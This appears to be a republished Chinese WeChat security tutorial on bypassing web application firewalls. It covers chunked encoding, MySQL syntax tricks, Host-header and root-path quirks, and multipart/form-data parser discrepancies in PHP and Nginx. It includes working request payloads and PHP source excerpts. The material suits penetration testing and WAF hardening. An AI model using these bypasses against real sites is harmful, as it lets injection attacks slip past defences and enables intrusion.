<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ydx4hIY1UjH2k0XnQV66QA)

点击上方 [蓝字]，关注我们

**建议大家把公众号 “Z2O 安全攻防” 设为星标，否则可能就看不到啦！**因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【设为星标】即可。

免责声明
====

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。

文章正文
====

WAF 中文名称 Web 应用防火墙，是针对于 HTTP(S) 协议特有的防护设备，在渗透测试中经常遇到，并且具有 WAF 防护的资产，测试难度会提升很多，因而，围绕 WAF 的攻防对抗技术也是渗透测试人员的一项必备技能。

WAF 攻防对抗一直是我所致力研究的领域。所谓知己知彼，想要了解 Bypass WAF 技巧，首先就要了解 WAF 的架构以及分类。

0x01 WAF 架构及分类
--------------

按照架构不同，WAF 产品大致可分为三类：1. 网络层的硬件 WAF；2. 基于代理或 WebServer 模块的应用层 WAF；3. 云 WAF 。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZUE3ib12GXTWAGtEIlBNaFjjuZaqmpl8PhyDPuPbYM5uHnkg0Tvbtr9Q/640?wx_fmt=png)

不同的架构有不同的绕过方式，举一个列子来说：对于网络层 WAF，可以通过数据包组包的各种技巧轻松实现 Bypass，而在应用层 WAF 中，WAF 所处理的 HTTP 请求是经过 WebServer 封装的，因此，在理论上不存在网络层组包绕过的可能性。而在云 WAF 场景下，由于不同的云具有不同的架构，因而也存在不确定性，在云 WAF 场景下，有一个较为经典的绕过方法：通过寻找真实业务 IP Bypass，因为云 WAF 架构，为了尽可能地兼容防护场景，通常支持业务服务器不在云上，而仅开通云防护来实现 WAF SaaS 功能，这种情况下基本都是通过高防 IP 处理请求流量再将流量回注到真实业务 IP 实现的，那么假设我们能够寻找到真实的业务 IP，就不用经过云 WAF 解析，直接完成了绕过。

按照防护策略，WAF 可分为：1. 正则引擎；2. 语义分析引擎；3. 机器学习引擎等，一些 WAF 产品会同时具有两套规则处理引擎，例如：既有正则引擎又有语义分析引擎。  
针对不同引擎的 Bypass 方式也不尽相同。例如，针对正则引擎 WAF 可以通过关键字拆分替换等方式绕过，而对于语义分析引擎则无法使用该方式，基于语义分析的 WAF Bypass 通常采用解析不一致来绕过，例如引擎对 SQL 语句解析采用 MySQL5.7 版本，而实际业务环境下使用 MySQL8.0，就势必会有部分语法解析出现不一致，就有可能会导致绕过。

0x02 通用 Bypass 与单一规则 Bypass
---------------------------

所谓通用 Bypass，就是指绕过以后，可以直接实现任意一种攻击而不受 WAF 阻拦。而单一规则 Bypass，是指仅能够绕过 WAF 对某一项规则的拦截，如 SQL 注入、XSS 等，绕过以后仅能够实现该类型的攻击，而其他类型的攻击仍会被拦截。下面我介绍三种：

### 1）chunked 编码导致通用 Bypass

这是一种在业内广为流传的绕过手法，在 2015 年前后对于网络层 WAF 的绕过十分有效。请看 Payload：

```
POST /1.php HTTP/1.1 
Host: x 
Content-Type: application/x-www-form-urlencoded 
Transfer-Encoding: chunked 

5 
a=111 
8 
and sel 
7 0 
ect 1 f 
0

```

利用这样的方法，将 select 危险关键字拆分，就可以在一定程度上对比 WAF 查杀。其中，倒数第三行的 7 0 是 chunked 编码中对于传递行的一种注释写法，这里的空白字符实际上是 \ t，根据 RFC，合法的注释符有; 和 \ t 两个。后面的 0 可以替换为 0x00 等，造成部分 WAF 解析失败。

这种通用 Bypass ，指的是这里既可以传递 SQL 注入漏洞执行语句，又可以传递 SSRF、命令注入、XXE 等漏洞的语句，因而造成了通用 Bypass。

### 2） SQL 注入规则 Bypass

再来举一个单一规则 Bypass 的例子。

在 MySQL 中，支持两种词法的优先解析，分别是浮点数和科学计数法。我们直接来看 SQL 语句：

```
SELECT-1.1FROM user;
SELECT-1e1FROM user;

```

在该句式中，会优先拆分出 - 1.1，而不会影响整体语句，但如果是 SELECT-1FROM user; 则会导致语法错误。这样的写法，就绕过了部分正则 WAF 的检测逻辑：

```
select\b[\s\S]*\bfrom

```

因而，产生了对于 SQL 注入规则的单一规则 Bypass，这种绕过方法，目前对于一部分市面上的 WAF 产品，仍然有效。

### 3）根目录 Bypass

这种 Bypass 是极端情况下产生的，目前并不能面积使用，介绍它主要是为了启发大家思路。

来看这样的案例：

```
GET ?id=1 HTTP/1.1 
Host: x 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) 
Accept: text/html,application/xhtml+xml,application/xml;
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Cookie: _ga=GA1.1.879724675.1523443475; _gid=GA1.1.295817556.1523443475

```

注意，在 GET 之后? 之前，少了本应该有的 /，对于 Nginx 服务器来说，会返回 400 Bad Request，而对于 Apache 来说，会默认将 / 补上，返回 200 OK。因而，对于前端是 Nginx 的 WAF 引擎，后端是 Apache HTTPD WebServer 的架构来说，前端 WAF 引擎接收不到 GET 参数，可能会放行，而后端的 Apache HTTPD 则能够正常处理。但是如果漏洞点不在根目录则无法利用此法绕过。对于一些 MVC 框架的网站（如：Discuz、PHPCMS）来说，全局路由都是通过 /?m=&a=&c= 来控制的，因此就比较适用。

### 4） Host 通用 Bypass

在 Nginx 源码中有这样一段内容：  
nginx/src/http/ngx_http_request.c  ,   line: 1928

```
for (i = 0; i < host->len; i++) 
{
    ch = h[i]; 
    switch (ch) { 
        case '.':
            if (dot_pos == i - 1) { 
                return NGX_DECLINED; 
            } 
            dot_pos = i; 
            break; 
        case ':': 
…… 
    if (dot_pos == host_len - 1) 
        { host_len--; }

```

尤其是最后两行，就是说，如果 header 头字段 Host 所传递的值最后一位是 . 那么，就将域名设定为删除. 以后所对应的域名。也就是说： a.com. 等于 a.com 。 于是，我们可以构造如下 Payload：

```
GET /?id=1 HTTP/1.1 
Host: a.com. 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) 
Accept: text/html,application/xhtml+xml,application/xml;
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Cookie: _ga=GA1.1.879724675.1523443475; _gid=GA1.1.295817556.1523443475


```

对于一些并不是需要所有域名都过 WAF 场景下尤为适用，因为这样修改了域名，可能会绕过配置中开启 WAF 防护的域名清单，因而所有流量就不会再经过 WAF 处理了。特别说明的是，这种 Bypass 方法在云 WAF 场景中也同样适用。

0x03 multipart/from-data 通用 Bypass
----------------------------------

该通用 Bypass 主要针对于漏洞点存在于 POST 参数之中的情况，对于漏洞点在 GET 参数，且无法转为 POST 参数的场景则无法使用。

我们知道，HTTP 协议 POST 请求，除了常规的 application/x-www-form-urlencoded 以外，还有 multipart/form-data 这种形式，主要是为了解决上传文件场景下文件内容较大且内置字符不可控的问题。multipart/form-data 格式也是可以传递 POST 参数的。对于 Nginx+PHP 的架构，Nginx 实际上是不负责解析 multipart/form-data 的 body 部分的，而是交由 PHP 来解析，因此 WAF 所获取的内容就很有可能与后端的 PHP 发生不一致。

以 PHP 为例，我们写一个简单的测试脚本：

```
<?php
echo file_get_contents("php://input");
var_dump($_POST);
var_dump($_FILES);
?>

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZz2ZzMgqiayyyHDrxAYCsichhgCgpFoG0DIuewByw2qUYopMsDYK9XqmA/640?wx_fmt=png)

此时，我们将其转为 multipart/form-data 格式：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZMX6rnVgB88mrnynr7eGqsmB2OgpSe6x3ibCyiao13p7MibIqryO51kdgg/640?wx_fmt=png)

可以看到，实际上和前一种 urlencoded 是达到了同一种效果，参数并没有进入 $_FILES 数组，而是进入了 $_POST 数组。那么，何时是上传文件？何时是 POST 参数呢？这个关键点在于有没有一个完整的 filename=。这 9 个字符是经过反复测试的，缺一个字符不可，替换一个字符也不可，在其中添加一个字符更不可。

加上了 filename = 以后的效果：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZk3swhYXaxAsGQiasB6zDsTRxAF8bFaCicvDqNrr9yOXrW3ibDVE3hVflg/640?wx_fmt=png)

Bypass WAF 的核心思想在于，一些 WAF 产品处于降低误报考虑，对用户上传文件的内容不做匹配，直接放行。事实上，这些内容在绝大多数场景也无法引起攻击。但关键问题在于，WAF 能否准确有效识别出哪些内容是传给 $_POST 数组的，哪些传给 $_FILES 数组？如果不能，那我们是否就可以想办法让 WAF 以为我们是在上传文件，而实际上却是在 POST 一个参数，这个参数可以是命令注入、SQL 注入、SSRF 等任意的一种攻击，这样就实现了通用 WAF Bypass。

Part 1
------

下面我们来看一下几种入门级的绕过思路：

### 1. 0x00 截断 filename

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZwAHvlk1sYIiak5zLq6cdbR3sUoG1EQXWNfWY4W3iaVkIibdPGRjrWzWiaA/640?wx_fmt=png)

注意在 filename 之前加入了 0x00，而有些 WAF 在检测前会删除 HTTP 协议中的 0x00，这样就导致了 WAF 认为是含有 filename 的普通上传，而后端 PHP 则认为是 POST 参数。

### 2. 双写上传描述行

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZXe22pibXzptTSbQ8CAWXob7P5PL0P1DOGnOJsdibtiaDjSYd2EnEwtkibQ/640?wx_fmt=png)

双写后，一些 WAF 会取第二行，而实际 PHP 会获取第一行。

### 3. 双写整个 part 开头部分

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZSWfb5PzYbDIEWNORI4cWAAiciaRRwKCtSM9dPGaOtvHZaoNLEW59kU9A/640?wx_fmt=png)

此时，该参数会引入一些垃圾数据，在命令注入及 SQL 注入的攻击场景，需要尽可能将前面的内容闭合。

### 4. 构造假的 part 部分 1

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZIxibkCW5n4p9SeWS6ia2KpATKfwus8ibudItPLMVWBd2fMlTG9ZkPFPibQ/640?wx_fmt=png)

该方法与前一种类似。

### 5. 构造假的 part 部分 2

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZhtHWb8L3qLQVG2BNZ6dB1OwjwWKDRWOlN9zCqE05oVOhRIVsmgNe4g/640?wx_fmt=png)

注意这里比前一种少了一个换行，数据纯净了许多。

### 6. 两个 boundary

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZHwDwXBW0XdRauGrXNRVkO4Q339XLicmKCj5egicPGgWkbnjsHDicyNeVA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZUoEJQIicMWiccibslzJRjzg1xdoof461WfCTuw2ntldhPJiaJvvzFRmcicA/640?wx_fmt=png)

对于 php 来说，真正的 boundary 是 a 。

### 7. 两个 Content-Type

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZO8N3z6STeL2kEp5h2s7UxquBiabia4xmkhg37OIO8GgOGoKq4bqOYEiag/640?wx_fmt=png)

boundary 仍然是 a

### 8. 空 boundary

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZfSMUG9EEiaZCicEvbtzzCGMx0XvbWXZic4RrwWxyatRHdYqumnoHs7pQQ/640?wx_fmt=png)

注意此时 boundary 是空的，并不是分号哦。

### 9. 空格 boundary

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZ0sWybbfvvCTojJxGKXiaoF9ECap3kTSmJyWKbjbkXDBOxSQiadkmSgAA/640?wx_fmt=png)

注意，此时 boundary 是可以为空格的。

### 10. boundary 中的逗号

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZNpJ6tcXhPoeRSibPcNdl0GdaW6hiac6GJymwibHicib5IWeQBtBZhrg4OxA/640?wx_fmt=png)

boundary 遇到逗号就结束了。

同理：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZEgbBGXPRNNtibicXpCkHAyqUkhuzficyicyIZH5ibXnGwbxhRNEImrjWEeA/640?wx_fmt=png)

Part2
-----

如果你能够融会贯通这十种思路，说明已经入门了，我们开始脑洞升级，来看一下进阶版：

### 1. 0x00 截断进阶

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZXkMspg88rwlCt83CCrdstefVD5FMwy2jPsX0YHB11uKXh6zZQ02BqA/640?wx_fmt=png)

前面，我们介绍了，如果是这样双写，其实是以第一行为主的，这样就是上传文件。但如果我们在适当的地方加入 0x00、空格和 \t ， 就会破坏第一行，让 PHP 反以第二行为主：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZwWfbsOtzSXyIicI03j8Fe5NyZn0RtziaBhXGc8gibBl56icYv1W3UvTllA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZMouWLMzzIsymr0xh5ZUyGtVzPPeiaicWQ8IS9cdT6icXVdkeStl83XAIw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZewsAXMaWTEcibiatOF22bQEXYoSmMMSHJw1Z1dkZGDsUGcHr2cicianmEA/640?wx_fmt=png)

这三个位置是首选的。将其替换为 0x00 和 0x20 与之同理， 大家可自行测试。

```
此外还有： 

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZvfl7NsTsqcl7c7laVIibwibEotpCTlaABNrKQmTNo5kDibOG6TrN2yiaUg/640?wx_fmt=png)

这里的 \ 0，也是可以的。

```
最容易被忽视的是参数名中的0x00。

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZOLWC12DYoI88Riar53tY2a6RuhxWegztccMSnEkLa3s67GLCSbEwRpg/640?wx_fmt=png)

由此测试还有一个十分鸡肋的方式，用处不大，但有意思。只有当网站获取全部 POST 数组后以参数前缀来取值的场景才可利用，因为参数名后缀部分不可控。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZMjAcSJFrS8zZxqsibJ5rdeTdN64ibRA5vic1hyPGpnQriayqkOOOSMdhOQ/640?wx_fmt=png)

### 2. boundary 进阶

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZdzEDSCR64BMBX7nic4YzlVnj0joFEicg2hZiboF1HN4XZNia4IibBf2FqAw/640?wx_fmt=png)

boundary 的名称是可以前后加入任意内容的，WAF 如果严格按 boundary 去取，又要上当了。

```
第一个Content-Type和冒号部分填入了空格。

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZMiaQVJ75QSRUfufTiblnn9WicvvdPWtZNphgMoWwhK0fgcVHTG1ib3eXzg/640?wx_fmt=png)

如何取 boundary 是一个问题：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZsf86mgaT96hyHwaicplaC9rqbOPkdJqOupIbKs9DI4RI57ib7TzSBXQA/640?wx_fmt=png)

### 3. 单双引号混合进阶

我们需要考虑的问题是，Content-Disposition 中的字段使用单引号还是双引号？

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZu5VlujUVpkGxS7UF6qcySTSvDhboSUD7tY21E4JibMPcfGCLpbZs3LA/640?wx_fmt=png)

### 4. urlencoded 伪装成为 multipart

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZHLSa1DrowDTCHG7nicRSAA7uEszLMmNtaDvkvL7FkZYuEy7xOicjCsdQ/640?wx_fmt=png)

这个 poc 很特殊。实际上是 urlencoded，但是伪装成了 multipart，通过 & 来截取前后装饰部分，保留 id 参数的完整性。理论上 multipart/form-data 下的内容不进行 urldecoded，一些 WAF 也正是这样设计的，这样做本没有问题，但是如果是 urlencoded 格式的内容，不进行 url 解码就会引入 %0a 这样字符，而这样的字符不解码是可以直接绕过防护规则的，从而导致了绕过。

Part2 部分相当于是 Part1 的一个扩展，篇幅有限，大家只需要在各个位置添加特殊字符 fuzz 即可。对于 Part3 却需要看一点 PHP 源码了。

Part3
-----

### 1. skip_upload 进阶 1

在 PHP 中，实际上是有一个 skip_upload 来控制上传行是否为上传文件的。来看这样一个例子：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZ5Lc6qQS0ib1O8DOFXLh5kWjqnMACjheIVVWbian96wrfgx6238J9xGqw/640?wx_fmt=png)

前面内容中我们介绍了，如果在第一行的 Content-Disposition 位置添加 \ 0，是有可能引起第一行失效，从而从上传文件变为 POST 参数的。除此以外，我们来看一下 php 源码 php-5.3.3/main/rfc1867.c  
, 其中 line: 991 有这样一段内容：

```
if (!skip_upload) { 
    char *tmp = param; 
    long c = 0; 
    while (*tmp) { 
        if (*tmp == '[') { 
            c++; 
        } else if (*tmp == ']') { 
            c--; 
            if (tmp[1] && tmp[1] != '[') { 
                skip_upload = 1; 
                break; 
            } 
        } 
        if (c < 0) {
            skip_upload = 1; 
            break; 
        } 
        tmp++; } 
}


```

其中的 param 参数是 也就是 id 这个参数，那么请问，如何能让它 skip_upload 呢？

```
没错，一些理解代码含义的同学应该已经有答案了。通过想办法进入c < 0，c原本是0，遇到[ 就自增1，遇到]就减一。那么，我们构造 name="f]" 即可让c=-1 。

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZzcqPKgdeQibvFzkqz3IeUyicg6YVc3xiaibvRovy854oVgIRvNs4S0JO7g/640?wx_fmt=png)

成功。事实上，只要参数中有不成对匹配的左右中括号都可以引发 skip_upload。

```
那么，还有其他的skip_upload吗？

```

### 2. skip_upload 进阶 2

还需要继续研究代码。在 php 源码 rfc1867.c line 909

```
/* If file_uploads=off, skip the file part */
            if (!PG(file_uploads)) {
                skip_upload = 1;
            } else if (upload_cnt <= 0) {
                skip_upload = 1;
                sapi_module.sapi_error(E_WARNING, "Maximum number of allowable file uploads has been exceeded");
            }

```

Maximum number of allowable file uploads has been exceeded ，如何达到 Maximum？ 发现在 php 5.2.12 和以上的版本，有一个隐藏的文件上传限制是在 php.ini 里没有的，就是这个 max_file_uploads 的设定，该默认值是 20, 在 php 5.2.17 的版本中该值已不再隐藏。文件上传限制最大默认设为 20，所以一次上传最大就是 20 个文档，所以超出 20 个就会出错了。

那么：

```
POST /8.php HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data;¬¬¬boundary=a;
Content-Length: 2065

--a
Content-Disposition: form-data; 
Content-Type: image/png

a
--a
Content-Disposition: form-data; 
Content-Type: image/png

b
--a
Content-Disposition: form-data; 
Content-Type: image/png

a
--a
Content-Disposition: form-data; 
Content-Type: image/png

b
--a
Content-Disposition: form-data; 
Content-Type: image/png

a
--a
Content-Disposition: form-data; 
Content-Type: image/png

b
--a
Content-Disposition: form-data; 
Content-Type: image/png

a
--a
Content-Disposition: form-data; 
Content-Type: image/png

b
--a
Content-Disposition: form-data; 
Content-Type: image/png

a
--a
Content-Disposition: form-data; 
Content-Type: image/png

b
--a
Content-Disposition: form-data; 
Content-Type: image/png

a
--a
Content-Disposition: form-data; 
Content-Type: image/png

b
--a
Content-Disposition: form-data; 
Content-Type: image/png

a
--a
Content-Disposition: form-data; 
Content-Type: image/png

b
--a
Content-Disposition: form-data; 
Content-Type: image/png

a
--a
Content-Disposition: form-data; 
Content-Type: image/png

b
--a
Content-Disposition: form-data; 
Content-Type: image/png

a
--a
Content-Disposition: form-data; 
Content-Type: image/png

b
--a
Content-Disposition: form-data; 
Content-Type: image/png

a
--a
Content-Disposition: form-data; 
Content-Type: image/png

b
--a
Content-Disposition: form-data; 
Content-Type: image/png

--a
Content-Disposition: form-data; ;
Content-Type: image/png

alert(1)
--a--

```

```
HTTP/1.1 200 OK
Server: nginx/1.19.5
Date: Thu, 03 Mar 2022 07:14:14 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.11
Content-Length: 4507

POST content:
POST:array(1) {
  ["id"]=>
  string(8) "alert(1)"
}

FILES:array(20) {
  ["a"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/php1FFea0"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["b"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpGwwobf"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["c"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpmJOlzI"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["d"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpL9SbXe"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["e"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/php5TEkl4"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["f"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpeAzjtW"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["g"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpKQX29k"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["h"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpN259vi"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["i"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpKjE3L1"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["j"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpxK3Ja2"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["k"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpKfmKKS"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["l"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpGbWp4q"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["m"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpfb4WGA"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["n"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpiW4wAU"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["o"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpHuAUlt"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["p"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpg9JuPK"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["q"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpOm7Vx9"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["r"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpg1iKx9"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["s"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpKnTJgz"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
  ["t"]=>
  array(5) {
    ["name"]=>
    string(5) "1.png"
    ["type"]=>
    string(9) "image/png"
    ["tmp_name"]=>
    string(26) "/private/var/tmp/phpJaXwzl"
    ["error"]=>
    int(0)
    ["size"]=>
    int(1)
  }
}

```

如果删除前面的 a-t 共计 20 个构造的 part，实际的效果并不能引起 POST 攻击。如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKua6nibIPVXFB5YhPMeEEffyZADAPampTN6HqzEqBf5xxgKIicEFzg2FdYCIxEbX1rFyju7AuuUWYDUQ/640?wx_fmt=png)

但是，如果拼接了这 20 个 part，实际上就填满了 Maximum，导致最后一个 upload 无法生效，就只能从 FILES 转化为 POST 了。

0x04 总结
-------

WAF 攻防对抗，看似仅仅是渗透测试中的一个环节，实际上，作为一个单独的攻防技术分支，有很多人正在努力研究。 对于 WAF 产品工程师来说，了解 Bypass 手段也十分必要，要经常假设攻击场景，大胆假设，小心求证，以期打造网络安全的钢铁长城。

```
来源：绿盟对抗自动化社区
原文：https://forum.ezreal.cool/thread-1-1-1.html
作者：又菜又爱玩
PS：如有侵权，联系删除。

```

技术交流
====

### 知识星球

致力于红蓝对抗，实战攻防，星球不定时更新内外网攻防渗透技巧，以及最新学习研究成果等。常态化更新最新安全动态。专题更新奇技淫巧小 Tips 及实战案例。

涉及方向包括 Web 渗透、免杀绕过、内网攻防、代码审计、应急响应、云安全。星球中已发布 300+ 安全资源，针对网络安全成员的普遍水平，并为星友提供了教程、工具、POC&EXP 以及各种学习笔记等等。

![](https://mmbiz.qpic.cn/mmbiz_jpg/h8P1KUHOKuZHR0HeHaxgPlffiaYyrFGx4iadXU0pyXia0fVh9NXgWHBBibDHVWwgtc3ib0MG0SliaufqXQM6mISpKIAg/640?wx_fmt=jpeg)

### 学习圈子

一个引导大家一起成长，系统化学习的圈子。如果看到这里的师傅是基础不够扎实 / 技术不够全面 / 入行安全不久 / 有充足时间的初学者... 其中之一，那么欢迎加入我们的圈子。在圈子内会每周规划学习任务，提供资料、技术文档，供大家一起学习、交流，由浅入深、层层递进。（[点我了解详情](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247496937&idx=1&sn=5cc9c27f57a18d54246f3d00987fa7e9&chksm=ceab1fa9f9dc96bf75a5c9b52ba7a7e61a4ee0114c3f9b0ad70278d52bb1d1cb06aa346789e4&scene=21#wechat_redirect)）

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZHR0HeHaxgPlffiaYyrFGx4IoPbpMic4L00jNSuLdjV3mbZevLx9I2ibs7a3nqBavM2B8E9lzDx72jw/640?wx_fmt=png)

### 交流群

关注公众号回复 “**加群**”，添加 Z2OBot 好友，自动拉你加入 **Z2O 安全攻防交流群 (微信群)** 分享更多好东西。**（QQ 群可直接扫码添加）**

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubCcJREicLMkEHIMkCDkGbfwqdiaWZUJtQ8ZNbMVFNTh7JyHdg69vRN2tBVbicNBAIWdgPQfjHoDxVmw/640?wx_fmt=png)

### 关注我们

**关注福利：**

**回复 “****app****" 获取  app 渗透和 app 抓包教程**

**回复 “****渗透字典** **" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**

**回复 “****书籍** **" 获取 网络安全相关经典书籍电子版 pdf**

****回复 “资料** **" 获取 网络安全、渗透测试相关资料文档****

点个【 在看 】，你最好看